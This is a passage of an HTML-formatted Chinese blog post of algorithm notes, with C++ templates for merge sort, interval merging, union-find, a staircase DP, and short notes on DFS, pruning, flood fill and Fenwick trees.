class=\"token punctuation\">,</span> j <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> k <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">&lt;=</span> mid <span class=\"token operator\">&amp;&amp;</span> j <span class=\"token operator\">&lt;=</span> r<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token comment\">// 找小的存进 tmp 中</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;=</span> q<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> tmp<span class=\"token punctuation\">[</span>k <span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> q<span class=\"token punctuation\">[</span>i <span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">else</span> tmp<span class=\"token punctuation\">[</span>k <span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> q<span class=\"token punctuation\">[</span>j <span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token comment\">// 如果还剩下有没放进 tmp 中的，就按顺序插入 tmp 的末尾</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token comment\">// 这两个循环最多只会执行一个</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">&lt;=</span> mid<span class=\"token punctuation\">)</span> tmp<span class=\"token punctuation\">[</span>k <span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> q<span class=\"token punctuation\">[</span>i <span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">&lt;=</span> r<span class=\"token punctuation\">)</span> tmp<span class=\"token punctuation\">[</span>k <span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> q<span class=\"token punctuation\">[</span>j <span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token comment\">// 再把 tmp 中的数据 copy 会原数组里</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> l<span class=\"token punctuation\">,</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> r<span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">,</span> j <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        q<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> tmp<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    cin <span class=\"token operator\">>></span> n<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> n<span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        cin <span class=\"token operator\">>></span> q<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token function\">mergesort</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> n<span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        cout <span class=\"token operator\">&lt;&lt;</span> q<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\" \"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><strong>&lt;vector&gt; 实现模板</strong></p>\n<p><code>emplace_back</code>  是 C++ 中用于在容器的末尾直接构造对象并添加到容器中的函数。分别将  <code>nums</code>  中的元素  <code>nums[i]</code>  和  <code>nums[j]</code>  添加到  <code>t</code>  中，而不是创建临时对象然后再复制将其添加到  <code>t</code>  中。这样做的好处是可以避免不必要的对象复制和移动，提高效率。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 输入向量类容器，对 [l.r] 进行排序</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">merge_sort</span><span class=\"token punctuation\">(</span>vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">&amp;</span> nums<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> l<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> r<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>l <span class=\"token operator\">>=</span> r<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">int</span> mid <span class=\"token operator\">=</span> l <span class=\"token operator\">+</span> r <span class=\"token operator\">>></span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">merge_sort</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">,</span> l<span class=\"token punctuation\">,</span> mid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token function\">merge_sort</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">,</span> mid<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> l<span class=\"token punctuation\">,</span> j <span class=\"token operator\">=</span> mid<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> t<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">&lt;=</span> mid <span class=\"token operator\">&amp;&amp;</span> j <span class=\"token operator\">&lt;=</span> r<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;=</span> nums<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            t<span class=\"token punctuation\">.</span><span class=\"token function\">emplace_back</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            t<span class=\"token punctuation\">.</span><span class=\"token function\">emplace_back</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">[</span>j<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">&lt;=</span> mid<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        t<span class=\"token punctuation\">.</span><span class=\"token function\">emplace_back</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">&lt;=</span> r<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        t<span class=\"token punctuation\">.</span><span class=\"token function\">emplace_back</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">[</span>j<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> l<span class=\"token punctuation\">,</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> r<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">,</span> <span class=\"token operator\">++</span>j<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        nums<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> t<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"区间合并\"><a class=\"anchor\" href=\"#区间合并\">#</a> 区间合并</h1>\n<p><strong>模板</strong></p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 将所有存在交集的区间合并</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>vector<span class=\"token operator\">&lt;</span>PII<span class=\"token operator\">></span> <span class=\"token operator\">&amp;</span>segs<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    vector<span class=\"token operator\">&lt;</span>PII<span class=\"token operator\">></span> res<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token function\">sort</span><span class=\"token punctuation\">(</span>segs<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> segs<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">int</span> st <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">2e9</span><span class=\"token punctuation\">,</span> ed <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">2e9</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">auto</span> seg <span class=\"token operator\">:</span> segs<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>ed <span class=\"token operator\">&lt;</span> seg<span class=\"token punctuation\">.</span>first<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>st <span class=\"token operator\">!=</span> <span class=\"token operator\">-</span><span class=\"token number\">2e9</span><span class=\"token punctuation\">)</span> res<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span>st<span class=\"token punctuation\">,</span> ed<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            st <span class=\"token operator\">=</span> seg<span class=\"token punctuation\">.</span>first<span class=\"token punctuation\">,</span> ed <span class=\"token operator\">=</span> seg<span class=\"token punctuation\">.</span>second<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">else</span> ed <span class=\"token operator\">=</span> <span class=\"token function\">max</span><span class=\"token punctuation\">(</span>ed<span class=\"token punctuation\">,</span> seg<span class=\"token punctuation\">.</span>second<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>st <span class=\"token operator\">!=</span> <span class=\"token operator\">-</span><span class=\"token number\">2e9</span><span class=\"token punctuation\">)</span> res<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span>st<span class=\"token punctuation\">,</span> ed<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    segs <span class=\"token operator\">=</span> res<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"dfs\"><a class=\"anchor\" href=\"#dfs\">#</a> DFS</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl83MjA2MDkyNS9hcnRpY2xlL2RldGFpbHMvMTI4NTMzMDc4\">三类最基础的 DFS 问题</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9vaS13aWtpLm9yZy9zZWFyY2gvZGZzLyMlRTglQTclQTMlRTklODclOEE=\">OI WikiDFS（搜索）</span></p>\n<h1 id=\"剪枝\"><a class=\"anchor\" href=\"#剪枝\">#</a> 剪枝</h1>\n<p>优化搜索顺序，排除等效冗余，可行性剪枝，最优性剪枝，记忆化搜索</p>\n<h1 id=\"flood-fill\"><a class=\"anchor\" href=\"#flood-fill\">#</a> Flood Fill</h1>\n<p><strong>洪水填充 (Flood fill) 算法</strong>：从一个起始节点开始把附近与其连通的节点提取出或填充成不同颜色颜色，直到封闭区域内的所有节点都被处理过为止，是从一个区域中提取若干个连通的点与其他相邻区域区分开 (或分别染成不同颜色) 的经典算法。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>原理：把一个点x的所有相邻的点都涂上x点的颜色，一直填充下去，直到这个区域内所有的点都被填充完为止。</pre></td></tr></table></figure><p>最简单的实现方法是采用深度优先搜索的递归方法，也可以采用广度优先搜索的迭代来实现。</p>\n<blockquote>\n<p>基于递归实现的泛洪填充算法有个致命的缺点，就是对于大的区域填充时可能导致栈溢出错误</p>\n</blockquote>\n<blockquote>\n<p>基于扫描线的算法实现了一种非递归的洪水填充算法。</p>\n<p>除提出连通区域外，还可以应用于计算从某一节点开始，到可能到达其他所有节点的距离。</p>\n<p>比如解决像走迷宫这类的问题。</p>\n</blockquote>\n<h1 id=\"并查集\"><a class=\"anchor\" href=\"#并查集\">#</a> 并查集</h1>\n<p><code>find()</code>  函数是一个用于并查集中查找元素所在集合的根节点的函数。在并查集中，每个集合都被一个树形结构表示，其中每个节点指向其父节点，直到根节点，根节点指向自己。 <code>find()</code>  函数的作用是找到某个元素所在集合的根节点，并且通过路径压缩优化树的结构。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> x<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        p<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">find</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 递归查找根节点，并进行路径压缩</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>在这个函数中，参数  <code>x</code>  是要查找的元素。函数首先检查当前元素  <code>x</code>  是否为根节点，如果不是，就递归地调用  <code>find()</code>  函数查找其父节点的根节点，并将其父节点的根节点直接设为当前节点的根节点，这就是路径压缩的过程。这个过程保证了在后续查找操作中，树的深度会被尽量减小，从而提高了后续操作的效率。</p>\n<p>最后，函数返回  <code>x</code>  所在集合的根节点  <code>p[x]</code> 。</p>\n<h1 id=\"dp\"><a class=\"anchor\" href=\"#dp\">#</a> DP</h1>\n<p>爬楼梯</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;bits/stdc++.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token keyword\">namespace</span> std<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token keyword\">int</span> N <span class=\"token operator\">=</span> <span class=\"token number\">1000010</span><span class=\"token punctuation\">,</span> MOD <span class=\"token operator\">=</span> <span class=\"token number\">1000000007</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span> LL<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>LL n<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>LL a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>LL dp<span class=\"token punctuation\">[</span>N<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%lld\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%lld%lld%lld\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>a<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>b<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token comment\">//dp [] 初始化</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  dp<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> n<span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token comment\">// 第 i 级台阶可以由第 i-a 或 i-b 或 i-c 级台阶到达</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">-</span> a <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> dp<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> dp<span class=\"token punctuation\">[</span>i <span class=\"token operator\">-</span> a<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">-</span> b <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> dp<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> dp<span class=\"token punctuation\">[</span>i <span class=\"token operator\">-</span> b<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">-</span> c <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> dp<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> dp<span class=\"token punctuation\">[</span>i <span class=\"token operator\">-</span> c<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    dp<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">%=</span> MOD<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%lld\"</span><span class=\"token punctuation\">,</span> dp<span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"树状数组\"><a class=\"anchor\" href=\"#树状数组\">#</a> 树状数组</h1>\n<p>支持 <strong>单点修改</strong> 和 <strong>区间查询</strong> 的，代码量小，快速求前缀和</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>求a1<span class=\"token operator\">~</span>a7的<span class=\"token number\">7</span>个数的和</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>a1<span class=\"token operator\">+</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token operator\">+</span>a7 <span class=\"token operator\">=</span> a1<span class=\"token operator\">+</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token operator\">+</span>a4   <span class=\"token operator\">+</span>   a5<span class=\"token operator\">+</span>a6   <span class=\"token operator\">+</span>   a7三个部分 <span class=\"token operator\">=</span> A <span class=\"token operator\">+</span> B <span class=\"token operator\">+</span> C</pre></td></tr></table></figure><figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 管辖区间</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>c<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span>管辖区间长度<span class=\"token number\">2</span><span class=\"token operator\">^</span>k，k恰好为x二进制表示中最低位的<span class=\"token number\">1</span>所在的二进制位位数，c<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span>管辖区间<span class=\"token punctuation\">[</span>x<span class=\"token operator\">-</span><span class=\"token 